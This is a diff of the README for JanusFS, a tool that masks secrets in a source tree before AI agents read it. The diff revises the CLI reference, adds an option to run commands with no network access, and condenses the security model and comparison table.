-| `janusfs exec -- <command> [args...]` | Run a command against a sanitized view of the current source tree, without a manual `mount` step first. Real, kernel-enforced confinement — a private mount namespace where the filtered view replaces the source at its own path; no path rewriting, no daemon required. Linux-only: refuses on other OSes. |
+| `janusfs install` | Optional setup: choose a custom mount root with `--root` (saved to `~/.janusfs/settings.json`). `--global-rules` also seeds `~/.janusfs/config/`. |
+| `janusfs daemon` | Run the long-lived daemon: owns every mount, resumes recorded ones, serves the dashboard. `--background`, `--ui-port` (default 7381), `--no-open`, `--debug`. |
+| `janusfs logs [-f]` | Show the background daemon's log; `-f` follows it. |
+| `janusfs mount <src> [mountpoint]` | Ask the daemon to mount a policy-enforced view and return immediately. `--name "<label>"` sets a dashboard name only. |
+| `janusfs mounts [--json]` | List active daemon mounts and recorded entries (`mounted`, `recorded`, `missing-src`, `stale`, `error`). |
+| `janusfs update [src\|mountpoint\|configpath]` | Re-apply edited `.janusfs.yml` without remounting (no arg = all mounts). |
+| `janusfs path <src>` | Print the mountpoint for a mounted source. |
+| `janusfs umount <mountpoint\|src>` | Unmount via the daemon; prunes stale entries; OS-unmount fallback if no daemon. |
+| `janusfs paths` | List the config/data paths JanusFS uses and whether each exists. |
+| `janusfs init [dir]` | Write secure-default `.janusfs.yml` to `[dir]` (default cwd). `--global` writes to `~/.janusfs/config/`. |
+| `janusfs check [path]` | Static linter: unknown builtins, bad regex (with its fail-closed consequence), directory-mask globs that can never mask, no-op negations. `--secrets` adds a heuristic scan for likely-Allowed secrets; `--matches` lists Hidden/Masked files; `--json`. |
+| `janusfs patterns` | List every reserved built-in mask pattern with its regex. `--json`. |
+| `janusfs explain <path>` | Trace why one path resolves the way it does; prints every contributing rule. `--json`, `--root`. |
+| `janusfs doctor` | Runtime health: FUSE status, active mounts, stale-mount/watchdog checks. |
+| `janusfs exec [--net=host\|none] -- <command> [args...]` | Run a command inside a real, kernel-enforced view of the current source tree (private mount namespace; no daemon required). `--net=none` denies all network (loopback only). Linux-only: refuses on other OSes. |
 
-All commands support `--help` and exit codes suitable for scripting. Errors are printed as a one-line cause; no Go stack traces reach the user.
+All commands support `--help` and script-friendly exit codes; errors print as a one-line cause, never a Go stack trace.
 
 ### `janusfs explain` example
 
@@ -511,58 +326,41 @@ All commands support `--help` and exit codes suitable for scripting. Errors are 
 $ janusfs explain --root ~/proj ~/proj/.env
 .env -> MASKED
   patterns: [env-value]
-  deciding rule: /Users/you/proj/.janusfs.yml:3
+  deciding rule: /home/you/proj/.janusfs.yml:3
   evaluation trace (in order applied):
-    /Users/you/.janusfs/config/.janusfs.yml:6  "*.env*"  -> masked
-    /Users/you/proj/.janusfs.yml:3             "*.env*"  -> masked
-```
-
-### `janusfs check` example
-
-```
-$ janusfs check --secrets
-/Users/you/proj/.janusfs.yml
-  [error]:2 invalid mask rule "*.log" — files it matches are Hidden (fail-closed) until this is fixed: compiling custom regex "[": error parsing regexp: missing closing ]: `[`
-  [warn]:8  mask glob "secrets" also matches a directory, which can never be Masked — the directory match is a harmless no-op
-      suggestion: rewrite to "secrets/**" if you meant to mask only the files inside
-
-/Users/you/proj/.env
-  [warn] likely secret file .env is currently Allowed (env file name)
-    suggestion: add a hide rule to .janusfs.yml, or a mask rule if the file is useful after redaction
-
-1 error(s), 2 warning(s) across 42 files, 7 directories.
+    /home/you/.janusfs/config/.janusfs.yml:6  "*.env*"  -> masked
+    /home/you/proj/.janusfs.yml:3             "*.env*"  -> masked
 ```
 
 ## Security model
 
-- **Trust boundary:** the mountpoint and the local HTTP dashboard. The agent is untrusted; the user operating the CLI is trusted. **This boundary is kernel-enforced on Linux** (via `janusfs exec`'s private mount namespace), which is the only platform JanusFS runs on. JanusFS is explicitly not a sandbox against a process that has, or can find, another way to the source (see Non-goals).
-- **Agents cannot weaken policy.** `.janusfs.yml` is read-only through the mount, regardless of any user rule. The dashboard's mutating endpoints (save config, reload rules) require the per-mount bearer token and are operator tools — they act as the trusted user, not through the agent's mount. The dashboard never serves raw source bytes.
+- **Trust boundary:** the mountpoint and the local HTTP dashboard. The agent is untrusted; the user operating the CLI is trusted. **The boundary is kernel-enforced on Linux** (via `janusfs exec`'s private mount namespace), the only platform JanusFS runs on. JanusFS is not a sandbox against a process that has another way to the source.
+- **Optional network deny.** `janusfs exec --net=none` runs the command in a network namespace with only loopback, kernel-enforced — closing the exfiltration channel for bytes the agent already read.
+- **Agents cannot weaken policy.** `.janusfs.yml` is read-only through the mount. The dashboard's mutating endpoints require the per-mount bearer token and act as the trusted user, never through the agent's mount. The dashboard never serves raw source bytes.
 - **Fail-closed under all faults.** Parser errors, cache corruption, redactor panics → paths read as Hidden (`EACCES`), never raw.
-- **No content on disk.** Redacted bytes live only in RAM; the history DB stores per-path counters and coverage snapshots, **never** file contents.
-- **Read path validates every time.** Every masked-file read revalidates `(mtime, size, inode)` against the cache key before serving — the authoritative change detector (there is no file watcher).
-- **Opens and directory listings check rule freshness too.** Every `open`/`opendir` probes the ancestor chain of `.janusfs.yml` files for on-disk changes (edited, added, or removed) and recompiles before resolving if anything moved — bounded by path depth, never a tree walk. This closes the gap where tightening a rule (or adding one to a previously bare directory) would otherwise silently have no effect until an explicit `janusfs update`. It does not cover global rules (`~/.janusfs/config/`) or paths nothing has opened since the edit — `janusfs update` remains the way to force those.
-- **Descriptor-relative reads.** The daemon opens the source directory once at mount time and every masked read goes through that retained descriptor with `O_NOFOLLOW`. Swapping a checked path for a symlink between the policy decision and the read cannot make the read follow the swap — the descriptor sees the file the decision was made against, not whatever the path string now resolves to.
+- **No content on disk.** Redacted bytes live only in RAM; the history DB stores per-path counters and coverage, **never** file contents.
+- **Read path validates every time.** Every masked-file read revalidates `(mtime, size, inode)` against the cache key before serving — the authoritative change detector.
+- **Descriptor-relative reads.** The daemon opens the source directory once at mount time; every masked read goes through that retained descriptor with `O_NOFOLLOW`, so swapping a checked path for a symlink between decision and read cannot redirect it.
 - **`~/.janusfs/` perms:** directory `0700`, files `0600`.
 
-See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for the full boundaries / assets / leak-channels table, updated at every phase exit.
+See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for the full boundaries / assets / leak-channels table.
 
 ## Comparison to alternatives
 
-| Approach | Handles secrets *inside* useful files? | Survives agent iterations? | Zero config-per-repo? | Perf near-native? |
+| Approach | Secrets *inside* useful files? | Survives agent iterations? | Zero config-per-repo? | Perf near-native? |
 |---|:-:|:-:|:-:|:-:|
 | `.gitignore` / `.aiexclude` | ❌ (whole-file only) | ✅ | ⚠️ per-repo | ✅ |
-| Harness sandbox (Seatbelt / Landlock / bubblewrap / srt) | ❌ (allow or deny only) | ✅ | ✅ | ✅ |
+| Harness sandbox (Seatbelt / Landlock / bubblewrap) | ❌ (allow or deny only) | ✅ | ✅ | ✅ |
 | Docker / devcontainer bind mount | ❌ (hands the agent the raw file) | ✅ | ⚠️ image setup | ✅ |
-| One-shot secret-scrubbing before agent hand-off | ⚠️ (frozen snapshot) | ❌ | ✅ | ✅ |
-| Manually curated read-only copy | ❌ (whole-file only) | ❌ (out of date instantly) | ⚠️ setup | ✅ |
-| Custom LLM tool wrappers that filter file reads | ⚠️ (per-tool, easily bypassed) | ⚠️ (per-tool discipline) | ⚠️ | ⚠️ |
+| One-shot secret-scrubbing before hand-off | ⚠️ (frozen snapshot) | ❌ | ✅ | ✅ |
+| Custom LLM tool wrappers that filter reads | ⚠️ (per-tool, easily bypassed) | ⚠️ (per-tool discipline) | ⚠️ | ⚠️ |
 | **JanusFS** | ✅ (per-span, byte-length preserving) | ✅ (FS boundary, per-read) | ✅ machine-wide via `~/.janusfs/config/` | ✅ (steady-state cache) |
 
 Sandboxes and containers are *complements*, not competitors — they decide allow/deny and protect the machine; JanusFS masks. Run `janusfs exec` inside them.
 
-## Development Guide
+## Development
 
-For details on building, formatting, running unit and FUSE integration tests, and validating the release configuration locally, see the **[Development Guide](docs/DEVELOPMENT.md)**.
+For building, formatting, running unit and FUSE integration tests, and validating the release config locally, see the **[Development Guide](docs/DEVELOPMENT.md)**.
 
 ## License
 
